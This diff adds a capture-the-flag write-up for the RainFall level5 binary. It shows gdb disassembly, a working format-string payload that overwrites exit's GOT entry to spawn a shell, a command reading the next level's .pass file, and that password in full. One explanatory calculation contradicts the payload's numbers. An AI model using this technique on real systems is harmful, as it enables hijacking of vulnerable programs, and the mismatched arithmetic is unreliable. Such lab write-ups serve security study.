@@ -1,0 +1,145 @@
+using gdb we get that there is 3 functions
+main , n , o
+main calls n and o is just there none calls it 
+
+// main
+--------------------------------------
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048504 <+0>:		push   ebp
+   0x08048505 <+1>:		mov    ebp,esp
+   0x08048507 <+3>:		and    esp,0xfffffff0
+   0x0804850a <+6>:		call   0x80484c2 <n>
+   0x0804850f <+11>:	leave
+   0x08048510 <+12>:	ret
+End of assembler dump.
+(gdb)
+--------------------------------------
+
+// n
+--------------------------------------
+(gdb) disas n
+Dump of assembler code for function n:
+   0x080484c2 <+0>:	push   ebp
+   0x080484c3 <+1>:	mov    ebp,esp
+   0x080484c5 <+3>:	sub    esp,0x218
+   0x080484cb <+9>:	mov    eax,ds:0x8049848
+   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
+   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
+   0x080484dc <+26>:	lea    eax,[ebp-0x208]
+   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
+   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
+   0x080484ea <+40>:	lea    eax,[ebp-0x208]
+   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
+   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
+   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
+   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+End of assembler dump.
+(gdb)
+--------------------------------------
+
+// o
+--------------------------------------
+(gdb) disas o
+Dump of assembler code for function o:
+   0x080484a4 <+0>:	push   ebp
+   0x080484a5 <+1>:	mov    ebp,esp
+   0x080484a7 <+3>:	sub    esp,0x18
+   0x080484aa <+6>:	mov    DWORD PTR [esp],0x80485f0
+   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
+   0x080484b6 <+18>:	mov    DWORD PTR [esp],0x1
+   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
+End of assembler dump.
+(gdb)
+--------------------------------------
+
+n gets a buffer of 512 and print it
+but the function doesn't return so we can't use ret to redirect to o
+in this we gonna use The Global Offset Table so we can redirect the function exit to 
+our dunction o that has "/bin/sh" in it
+
+----------The Global Offset Table------------
+The Global Offset Table, or GOT, is a section of a computer program's
+(executables and shared libraries) memory used to enable computer program code compiled
+as an ELF file to run correctly, independent of the memory address where the program's
+code or data is loaded at runtime.
+---------------------------------------------
+
+so we need in general to make the address of got turn to the address of o
+GOT_address = o_address
+
+we have the printf/fget vulnerability again so we will abuse the %n again to overrride got address
+
+firstly let's get the GOT adddress we will get it from the gdb:
+
+-> check the n function assembly:
+--------------------------------------
+(gdb) disassemble n
+Dump of assembler code for function n:
+   0x080484c2 <+0>:		push   ebp
+   0x080484c3 <+1>:		mov    ebp,esp
+   0x080484c5 <+3>:		sub    esp,0x218
+   0x080484cb <+9>:		mov    eax,ds:0x8049848
+   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
+   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
+   0x080484dc <+26>:	lea    eax,[ebp-0x208]
+   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
+   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
+   0x080484ea <+40>:	lea    eax,[ebp-0x208]
+   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
+   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
+   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
+   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+End of assembler dump.
+(gdb)
+--------------------------------------
+
+-> then as u can see at address 0x080484ff there is the function exit
+	let's dissassable it to check the GOT address it points to:
+
+--------------------------------------
+(gdb) disassemble 0x80483d0
+Dump of assembler code for function exit@plt:
+   0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838
+   0x080483d6 <+6>:	push   0x28
+   0x080483db <+11>:	jmp    0x8048370
+End of assembler dump.
+(gdb)
+--------------------------------------
+
+-> now as we can see at address 0x080483d0 exit jumps to 0x8049838
+	and that's the GOT address we need
+	
+now that we got GOT address we need to know how much bytes needed to let %n get the exact o address
+o adress is 0x080484a4 so in decimal it's 134513828
+so we need 134513828 bytes
+
+now we need to know in which argument we can start reading the things we add to the stack using:
+
+--------------------------------------
+ > level5@RainFall:~$ cat <(python -c "print 'AAAABBBBCCCC' + '%X ' * 512") | ./level5
+AAAABBBBCCCC200 B7FD1AC0 B7FF37D0 41414141 42424242 43434343 25205825 ....
+--------------------------------------
+
+as u can see "41414141" is written in 4th place, so 4 argument is what we seek
+
+- we got GOT address
+- we got the offset of how much needed to get o_address
+- we got the argument
+
+now we need just a small python script and we finish
+
+and this is the script:
+
+--[ python -c "print '\x38\x98\x04\x08' + '%134513824x' + '%4\$n'" ]--
+
+-> '\x38\x98\x04\x08' is Got address in endean 
+-> '%134513824x' is the offset bc we need 134518838 and we have already 4 bytes of o_address so
+	it's 134518838 - 4 = 134518834
+-> '%4\$n store in the 4th argument the number of bytes
+
+ > cat <(python -c "print '\x38\x98\x04\x08' + '%134513824x' + '%4\$n'") - | ./level5
+ ...
+                                                                             200
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
